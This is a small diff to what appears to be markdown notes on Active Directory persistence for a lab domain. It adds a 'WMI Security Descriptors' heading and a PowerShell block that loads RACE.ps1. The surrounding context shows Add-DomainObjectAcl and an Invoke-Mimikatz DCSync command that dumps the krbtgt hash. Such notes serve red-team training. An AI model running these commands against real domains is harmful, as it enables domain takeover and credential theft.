@@ -97,8 +97,13 @@ C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -P
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
-- **Security Descriptors**
+- **WMI Security Descriptors**
+```powershell
+C:> . .\RACE.ps1
 
+C:> 
+
+```
 ### MORE
 
 
